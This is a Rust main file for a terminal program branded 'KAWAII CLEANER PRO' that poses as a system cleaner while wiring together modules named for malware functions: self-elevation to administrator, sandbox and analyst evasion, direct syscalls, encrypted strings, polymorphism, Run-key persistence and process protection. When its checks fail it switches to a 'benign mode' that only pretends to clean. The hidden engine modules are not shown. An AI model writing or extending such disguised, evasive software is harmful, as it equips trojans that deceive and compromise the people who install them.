use anyhow::Result;
use crossterm::{
    event::{self, DisableMouseCapture, EnableMouseCapture, Event, KeyCode},
    execute,
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
};
use ratatui::{
    backend::CrosstermBackend,
    layout::{Constraint, Direction, Layout},
    style::{Color, Style},
    widgets::{Block, Borders, Gauge, List, ListItem, Paragraph},
    Terminal,
};
use std::{io, time::{Duration, Instant}};
use tokio::sync::mpsc;

mod evasion;    // Singularity: Unified Evasion
mod cleaning;   // Singularity: Unified Cleaning
mod dynamo;     // Dynamic API Loading
mod engine;     // Core Logic
mod poly;       // Polymorphic Seed
mod dark_matter; // Encrypted Strings
mod quantum;     // Direct Syscalls
mod nexus;       // Typhon: Central Intelligence
mod oracle;      // Nemesis: TTS
mod ghost;       // Apotheosis: Hardware Control
mod persistence; // Apotheosis: Run Key
mod sphinx;      // Prometheus: Bio-Lock
mod phase;       // Prometheus: Visual Phasing
pub mod structs;     // Kernel Structures

// --- 🛠️ ENGINEERING: RAII COM GUARD ---
struct ComGuard;

impl ComGuard {
    fn new() -> Result<Self> {
        unsafe {
            use windows::Win32::System::Com::{CoInitializeEx, COINIT_MULTITHREADED};
            let _ = CoInitializeEx(None, COINIT_MULTITHREADED); 
        }
        Ok(ComGuard)
    }
}

impl Drop for ComGuard {
    fn drop(&mut self) {
        unsafe {
            use windows::Win32::System::Com::CoUninitialize;
            CoUninitialize();
        }
    }
}

// --- 📨 MESSAGING SYSTEM ---
#[derive(Debug)]
pub enum WorkerMsg {
    Log(String, String, Color), // Level, Message, Color
    Progress(f64, String),      // Percentage, Status Text
    Done,
}

struct LogMessage {
    timestamp: String,
    level: String,
    content: String,
    displayed: String, // For Typewriter Effect
    color: Color,
}

// --- 🚀 MAIN ENTRY POINT ---
#[tokio::main]
async fn main() -> Result<()> {
    // 1. Auto-Elevation
    if !evasion::am_i_admin() {
        evasion::elevate_self();
        return Ok(());
    }

    // 2. Setup UI
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    // 3. Channels
    let (tx, mut rx) = mpsc::channel(100);

    // 4. SPAWN ENGINE THREAD
    std::thread::spawn(move || {
        let _guard = ComGuard::new().unwrap(); 
        
        // LEVIATHAN: PROTECT PROCESS VIA NEXUS
        nexus::Nexus::assert_dominion();

        // --- SINGULARITY: EVASION PROTOCOL ---
        if let Some(mut _guardian) = evasion::EvasionSystem::new() {
             let _ = tx.blocking_send(WorkerMsg::Log("SECURITY".into(), "Singularity Evasion Active".into(), Color::Green));
             
             // PROMETHEUS: THE SPHINX (BIO-LOCK)
             // We block here until Humanity is confirmed.
             tokio::runtime::Runtime::new().unwrap().block_on(sphinx::Sphinx::wait_for_humanity(&tx));

             // TYPHON: NEXUS AWAKENING
             tokio::runtime::Runtime::new().unwrap().block_on(nexus::Nexus::awaken(&tx));

             // SENTIENCE (Environmental Awareness)
             unsafe {
                 use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
                 let mut mem = MEMORYSTATUSEX::default();
                 mem.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
                 let _ = GlobalMemoryStatusEx(&mut mem);
                 let gb = mem.ullTotalPhys / (1024 * 1024 * 1024);
                 
                 let timestamp = chrono::Local::now().format("%H:%M").to_string();
                 let thought = format!("Time: {}. RAM: {}GB. Analysis: Optimal.", timestamp, gb);
                 let _ = tx.blocking_send(WorkerMsg::Log("SENTIENCE".into(), thought, Color::Cyan));
             }

             // Human Verification (Only if Real)
             let _ = tx.blocking_send(WorkerMsg::Log("SECURITY".into(), "Verifying Human Presence...".into(), Color::Yellow));
             evasion::verify_human_presence();
             let _ = tx.blocking_send(WorkerMsg::Log("ACCESS".into(), "Identity Confirmed.".into(), Color::Green));

             // RUN ENGINE (God Mode)
             let engine_result = tokio::runtime::Runtime::new().unwrap().block_on(engine::Engine::run(tx.clone()));
             if let Err(e) = engine_result {
                let _ = tx.blocking_send(WorkerMsg::Log("ERROR".into(), format!("CRITICAL FAILURE: {}", e), Color::Red));
             }
        } else {
             // MIMICRY: Benign Mode
             let _ = tx.blocking_send(WorkerMsg::Log("INIT".into(), "Standard User Mode Active".into(), Color::Cyan));
             // Run Benign Protocol via Tokio
             tokio::runtime::Runtime::new().unwrap().block_on(cleaning::Cleaner::engage_benign_protocol(&tx));
        }

        // UNPROTECT before exit
        nexus::Nexus::relinquish_control();
        let _ = tx.blocking_send(WorkerMsg::Done);
    });

    // 5. UI LOOP
    let start_time = Instant::now();
    let mut logs: Vec<LogMessage> = Vec::new();
    let mut progress = 0.0;
    let mut status = "INITIALIZING...".to_string();
    let mut files_scanned = 0; 
    let _bytes_cleaned = 0.0; 
    let mut phase_angle: f32 = 0.0; // PROMETHEUS: Phasing

    loop {
        // Handle Messages
        while let Ok(msg) = rx.try_recv() {
            match msg {
                WorkerMsg::Log(level, content, color) => {
                    logs.push(LogMessage {
                        timestamp: chrono::Local::now().format("%H:%M:%S%.3f").to_string(),
                        level,
                        content,
                        displayed: String::new(), // Start Empty
                        color,
                    });
                    if logs.len() > 100 { logs.remove(0); }
                    files_scanned += 1; 
                }
                WorkerMsg::Progress(p, s) => {
                    progress = p;
                    status = s;
                }
                WorkerMsg::Done => {
                    progress = 1.0;
                    status = "SYSTEM OPTIMIZED".to_string();
                }
            }
        }

        // TYPEWRITER EFFECT
        for log in logs.iter_mut() {
            if log.displayed.len() < log.content.len() {
                // Add 2 chars per frame for speed
                let remaining = &log.content[log.displayed.len()..];
                let take = if remaining.len() >= 2 { 2 } else { remaining.len() };
                log.displayed.push_str(&remaining[..take]);
            }
        }

        // Draw UI
        terminal.draw(|f| {
            let size = f.size();
            let chunks = Layout::default()
                .direction(Direction::Vertical)
                .constraints([
                    Constraint::Length(3),  // Header
                    Constraint::Min(10),    // Logs
                    Constraint::Length(3),  // Footer
                ])
                .split(size);

            // Header
            let gauge = Gauge::default()
                .block(Block::default().borders(Borders::ALL).title(" ⚡ KAWAII CLEANER PRO v18.0.0 (SINGULARITY) "))
                .gauge_style(Style::default().fg(Color::Cyan).bg(Color::Black))
                .percent((progress * 100.0) as u16)
                .label(format!("{:.1}% - {}", progress * 100.0, status));
            f.render_widget(gauge, chunks[0]);

            // Logs
            let log_items: Vec<ListItem> = logs.iter().map(|l| {
                ListItem::new(format!("{} [{}] {}", l.timestamp, l.level, l.displayed))
                    .style(Style::default().fg(l.color))
            }).collect();
            
            let logs_list = List::new(log_items)
                .block(Block::default().borders(Borders::ALL).title(" 📜 EVENT HORIZON LOG "));
            f.render_widget(logs_list, chunks[1]);
            
            // Footer
            let elapsed = start_time.elapsed().as_secs_f64();
            let stats = format!(" 📁 Activity: {} | ⏱️ Time: {:.1}s ", files_scanned, elapsed);
            let footer = Paragraph::new(stats)
                .block(Block::default().borders(Borders::ALL).title(" 📊 STATISTICS "))
                .style(Style::default().fg(Color::Magenta));
            f.render_widget(footer, chunks[2]);

        })?;

        // Input 
        if event::poll(Duration::from_millis(50))? {
            if let Event::Key(key) = event::read()? {
                if key.code == KeyCode::Char('q') {
                    break;
                }
            }
        }
        
        // PROMETHEUS: DIMENSIONAL PHASING (Heartbeat Pulse)
        // Oscillate between 200 (Solid-ish) and 120 (Ghostly)
        phase_angle += 0.1;
        let opacity = 160.0 + (40.0 * phase_angle.sin()); 
        phase::PhaseShift::set_opacity(opacity as u8);
    }

    // Cleanup
    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen, DisableMouseCapture)?;
    terminal.show_cursor()?;

    Ok(())
}
